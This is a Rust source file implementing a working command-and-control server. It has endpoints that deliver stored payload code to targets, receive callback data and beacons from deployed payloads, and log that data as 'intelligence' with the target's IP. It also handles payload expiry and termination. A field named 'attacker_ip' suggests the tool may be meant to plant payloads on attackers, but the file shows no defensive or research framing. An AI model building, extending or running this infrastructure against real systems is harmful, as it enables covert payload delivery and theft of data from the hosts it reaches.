/**
 * C2 (Command & Control) Infrastructure
 *
 * Provides HTTP server for payload callbacks and intelligence collection.
 * Handles:
 * - Payload delivery endpoints
 * - Callback data ingestion
 * - Heartbeat/beacon tracking
 * - Intelligence data storage
 */

use anyhow::Result;
use axum::{
    extract::{Path, State},
    http::StatusCode,
    routing::{get, post},
    Json, Router,
};
use serde::{Deserialize, Serialize};
use std::sync::Arc;
use tokio::sync::Mutex;
use tower_http::cors::CorsLayer;

use crate::storage::Database;

/**
 * C2 callback data
 */
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct C2Callback {
    pub payload_id: String,
    pub timestamp: String,
    pub data_type: String,
    pub data: serde_json::Value,
}

/**
 * Intelligence data extracted from callbacks
 */
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct IntelligenceData {
    pub id: Option<i64>,
    pub payload_id: String,
    pub timestamp: String,
    pub data_type: String,
    pub data: String,
    pub attacker_ip: String,
}

/**
 * C2 Server state
 */
#[derive(Clone)]
struct C2State {
    db: Arc<Mutex<Database>>,
    stats: Arc<Mutex<C2Stats>>,
}

/**
 * C2 Server statistics
 */
#[derive(Debug, Default)]
struct C2Stats {
    payloads_served: u64,
    callbacks_received: u64,
    heartbeats_received: u64,
}

/**
 * C2 Server
 */
pub struct C2Server {
    port: u16,
    use_tls: bool,
    db: Arc<Mutex<Database>>,
}

impl C2Server {
    pub fn new(port: u16, use_tls: bool, db: Arc<Mutex<Database>>) -> Self {
        Self { port, use_tls, db }
    }

    /**
     * Start the C2 server
     */
    pub async fn start(&self) -> Result<()> {
        let state = C2State {
            db: Arc::clone(&self.db),
            stats: Arc::new(Mutex::new(C2Stats::default())),
        };

        // Build router
        let app = Router::new()
            // Payload serving
            .route("/p/:payload_id", get(serve_payload))
            // C2 callbacks
            .route("/c2/callback/:payload_id", post(handle_callback))
            // Heartbeats
            .route("/c2/heartbeat/:payload_id", post(handle_heartbeat))
            // Health check
            .route("/health", get(health_check))
            // Statistics
            .route("/stats", get(get_stats))
            // CORS middleware
            .layer(CorsLayer::permissive())
            .with_state(state);

        // Bind address
        let addr = format!("0.0.0.0:{}", self.port);
        let listener = tokio::net::TcpListener::bind(&addr).await?;

        tracing::info!("C2 Server listening on {}", addr);

        // Start server
        axum::serve(listener, app).await?;

        Ok(())
    }
}

/**
 * Serve a payload
 *
 * GET /p/:payload_id
 */
async fn serve_payload(
    Path(payload_id): Path<String>,
    State(state): State<C2State>,
) -> Result<String, (StatusCode, String)> {
    let db = state.db.lock().await;

    // Get payload from database
    let result = db
        .query_row_raw(
            "SELECT payload_code, status, expires_at FROM payloads WHERE payload_id = ?",
            rusqlite::params![payload_id],
            |row| {
                Ok((
                    row.get::<_, String>(0)?,
                    row.get::<_, String>(1)?,
                    row.get::<_, String>(2)?,
                ))
            },
        );

    match result {
        Ok(row) => {
            let code: String = row.0;
            let status: String = row.1;
            let expires_at: String = row.2;

            // Check expiration
            let expires = chrono::DateTime::parse_from_rfc3339(&expires_at)
                .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()))?;

            if expires < chrono::Utc::now() {
                // Update status to expired
                let _ = db.execute_raw(
                    "UPDATE payloads SET status = 'expired' WHERE payload_id = ?",
                    rusqlite::params![payload_id],
                );

                return Err((
                    StatusCode::NOT_FOUND,
                    "Payload expired".to_string(),
                ));
            }

            // Check status
            if status == "terminated" || status == "expired" {
                return Err((
                    StatusCode::NOT_FOUND,
                    format!("Payload {}", status),
                ));
            }

            // Mark as delivered if first time
            if status == "ready" {
                let _ = db.execute_raw(
                    "UPDATE payloads SET status = 'active', delivered_at = ? WHERE payload_id = ?",
                    rusqlite::params![chrono::Utc::now().to_rfc3339(), payload_id],
                );
            }

            // Increment delivery count
            let _ = db.execute_raw(
                "UPDATE payloads SET delivery_count = delivery_count + 1 WHERE payload_id = ?",
                rusqlite::params![payload_id],
            );

            // Update stats
            let mut stats = state.stats.lock().await;
            stats.payloads_served += 1;

            Ok(code)
        }
        Err(_) => Err((
            StatusCode::NOT_FOUND,
            "Payload not found".to_string(),
        )),
    }
}

/**
 * Handle C2 callback
 *
 * POST /c2/callback/:payload_id
 */
async fn handle_callback(
    Path(payload_id): Path<String>,
    State(state): State<C2State>,
    Json(callback): Json<C2Callback>,
) -> Result<Json<serde_json::Value>, (StatusCode, String)> {
    let db = state.db.lock().await;

    // Verify payload exists and is active
    let payload_exists = db
        .query_row_raw(
            "SELECT status, target_ip FROM payloads WHERE payload_id = ?",
            rusqlite::params![payload_id],
            |row| Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?)),
        )
        .map_err(|e| (StatusCode::NOT_FOUND, format!("Payload not found: {}", e)))?;

    let (status, target_ip) = payload_exists;

    if status == "terminated" || status == "expired" {
        return Err((
            StatusCode::FORBIDDEN,
            "Payload no longer active".to_string(),
        ));
    }

    // Store intelligence data
    let data_json = serde_json::to_string(&callback.data)
        .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()))?;

    db.execute_raw(
        r#"
        INSERT INTO intelligence (
            payload_id, timestamp, data_type, data, attacker_ip
        ) VALUES (?, ?, ?, ?, ?)
        "#,
        rusqlite::params![
            payload_id,
            chrono::Utc::now().to_rfc3339(),
            callback.data_type,
            data_json,
            target_ip,
        ],
    )
    .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()))?;

    // Increment callback count
    db.execute_raw(
        "UPDATE payloads SET c2_callback_count = c2_callback_count + 1, last_callback_at = ? WHERE payload_id = ?",
        rusqlite::params![chrono::Utc::now().to_rfc3339(), payload_id],
    )
    .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()))?;

    // Check if max callbacks reached
    let callback_count = db
        .query_row_raw(
            "SELECT c2_callback_count FROM payloads WHERE payload_id = ?",
            rusqlite::params![payload_id],
            |row| row.get::<_, i64>(0),
        )
        .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()))?;

    if callback_count >= 100 {
        // Terminate payload
        db.execute_raw(
            "UPDATE payloads SET status = 'terminated' WHERE payload_id = ?",
            rusqlite::params![payload_id],
        )
        .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()))?;
    }

    // Update stats
    let mut stats = state.stats.lock().await;
    stats.callbacks_received += 1;

    Ok(Json(serde_json::json!({ "status": "ok" })))
}

/**
 * Handle heartbeat/beacon
 *
 * POST /c2/heartbeat/:payload_id
 */
async fn handle_heartbeat(
    Path(payload_id): Path<String>,
    State(state): State<C2State>,
    Json(data): Json<serde_json::Value>,
) -> Result<Json<serde_json::Value>, (StatusCode, String)> {
    let db = state.db.lock().await;

    // Verify payload exists
    let payload_exists = db
        .query_row_raw(
            "SELECT status FROM payloads WHERE payload_id = ?",
            rusqlite::params![payload_id],
            |row| row.get::<_, String>(0),
        )
        .is_ok();

    if !payload_exists {
        return Err((StatusCode::NOT_FOUND, "Payload not found".to_string()));
    }

    // Store heartbeat as intelligence
    let data_json = serde_json::to_string(&data)
        .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()))?;

    db.execute_raw(
        r#"
        INSERT INTO intelligence (
            payload_id, timestamp, data_type, data, attacker_ip
        ) VALUES (?, ?, ?, ?, ?)
        "#,
        rusqlite::params![
            payload_id,
            chrono::Utc::now().to_rfc3339(),
            "heartbeat",
            data_json,
            "", // Will be populated from payloads table if needed
        ],
    )
    .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()))?;

    // Update last callback time
    db.execute_raw(
        "UPDATE payloads SET last_callback_at = ? WHERE payload_id = ?",
        rusqlite::params![chrono::Utc::now().to_rfc3339(), payload_id],
    )
    .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()))?;

    // Update stats
    let mut stats = state.stats.lock().await;
    stats.heartbeats_received += 1;

    Ok(Json(serde_json::json!({ "status": "alive" })))
}

/**
 * Health check endpoint
 *
 * GET /health
 */
async fn health_check() -> Json<serde_json::Value> {
    Json(serde_json::json!({
        "status": "healthy",
        "timestamp": chrono::Utc::now().to_rfc3339()
    }))
}

/**
 * Get C2 statistics
 *
 * GET /stats
 */
async fn get_stats(State(state): State<C2State>) -> Json<serde_json::Value> {
    let stats = state.stats.lock().await;

    Json(serde_json::json!({
        "payloads_served": stats.payloads_served,
        "callbacks_received": stats.callbacks_received,
        "heartbeats_received": stats.heartbeats_received,
        "timestamp": chrono::Utc::now().to_rfc3339()
    }))
}
